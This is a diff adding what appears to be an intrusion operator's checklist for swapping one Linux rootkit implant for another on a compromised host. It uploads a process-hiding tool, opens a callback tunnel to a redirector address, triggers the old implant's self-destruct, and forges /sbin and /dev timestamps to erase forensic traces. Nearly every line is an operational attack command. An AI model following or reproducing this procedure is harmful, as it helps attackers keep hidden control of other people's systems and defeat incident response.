@@ -1,0 +1,72 @@
+### Upgrading a Linux Incision to a Stoicsurgeon
+
+### Step 1: Trigger Incision or -elevate
+
+### Step 2: Save timestamps of affected files/directories
+stat -t /dev /sbin /sbin/init /dev/ttyi* >L:/current/down/beforetimes
+
+### Step 3: Upload dittlelight
+-put /current/up/hidelite.linux h
+
+### Step 4: Need a nopen callback window to use dittlelight (will not 
+###         work on any pids with parents that aren't 1, and callback
+###         windows do that)
+-nrtun PORT
+-call REDIR_IP:PORT
+
+### Step 5: In the callback window, get your PID (and make sure the 
+###         PPID is 1
+-pid
+
+### Step 6: Unhide your callback window
+./h -u -p CALLBACK_PID
+
+### Step 7: Make sure you are unhidden by comparing process listings
+###         and directory listings, and there should be differences
+ps -ef | grep sendmail
+-lt /dev/ttyi*
+
+### Step 8: In unhidden window, trigger Incision self-destruct
+touch /dev/ttyia3
+
+### Step 9: Repeat step 7, except now instead of being different,
+###         the two windows should now be the same because Incision
+###         is gone, so everything is unhidden
+ps -ef | grep sendmail
+-lt /dev/ttyi*
+
+### Step 10: Remove file we touched/"created"
+-rm /dev/ttyia3
+
+### Step 11: At this point, follow the "user.tool.stoicsurgeon"
+### script in /current/etc to install Stoicsurgeon
+
+### Step 12: Once Stoicsurgeon is installed, restore timestamps 
+###          for the files/dirs affected by the Incision uninstall
+###          These are saved in "/current/down/beforetimes" from Step 2
+###          NOTE: If "-ctrl" does not work, upload and run the standalone
+###                "Ctrl" program, computing the SEED variable as described
+###                in the "user.tool.stoicsurgeon" script if needed, or
+###                you can trigger and not need the SEED
+-ctrl -s /sbin/init ATIME 0 MTIME 0 CTIME 0
+-ctrl -s /sbin ATIME 0 MTIME 0 CTIME 0
+-ctrl -s /dev ATIME 0 MTIME 0 CTIME 0
+
+### Step 13: Confirm timestamps are restored
+###          This is a bit tricky to see that everything is right, so
+###          confirm that:
+###          1. everything for /sbin should match (i.e. no diff line)
+###          2. there should be no /dev/ttyia* files in aftertimes
+###          3. /dev may not match exactly if there were changes, but
+###             /dev can change a lot so not a huge deal
+###          4. the timestamps for /sbin/init should be the same in
+###             beforetimes and aftertimes
+###          5. the inode field (8th field in stat output) from 
+###             /dev/ttyia1 in beforetimes should match inode field
+###             from /sbin/init in aftertimes
+stat -t /dev /sbin /sbin/init /dev/ttyi* >L:/current/down/aftertimes
+-lsh diff /current/down/beforetimes /current/down/aftertimes
+
+### All done!$###$
+
+
